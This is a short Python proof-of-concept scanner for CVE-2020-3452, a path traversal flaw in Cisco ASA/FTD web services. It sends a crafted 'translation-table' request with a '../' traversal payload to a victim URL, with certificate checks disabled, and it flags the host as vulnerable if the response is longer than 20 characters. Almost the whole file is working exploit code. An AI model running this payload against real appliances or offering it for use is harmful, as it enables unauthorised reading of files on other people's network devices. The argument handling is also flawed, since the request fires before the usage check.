#encoding:UTF-8
#!/usr/bin/python
#version1.0
import requests
from bs4 import BeautifulSoup
import sys

url = sys.argv[1]
payload = "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
s = requests.Session()
c = url + payload
c1 = s.get(c, verify=False)    #verify移除SSL憑證

def usage():
    print("usage：.\CVE_2020_3452.py <victim_url>")
    print("example：.\CVE_2020_3452.py https://127.0.0.1")
    sys.exit(0)

def sel():
    if len(c1.text) > 20:
        return "good"
    else:
        #soup = BeautifulSoup(c1.text, "html.parser")
        #print(soup)
        #a = soup.select("center")[0].find("b").text
        return "Bad"

def main():
    if not len(sys.argv[1:]):
        usage()
    elif sys.argv[1] == "-h":
        usage()

    try:
        #print(c1.text)
        #print(sel())
        if sel() != "Bad":
            print(url + '\033[1;31;40m Vulnerable \033[0m')
        else:
            print(url + ' - Not Vulnerable')
        
    except:
        usage()
   
if __name__ == '__main__':
    main()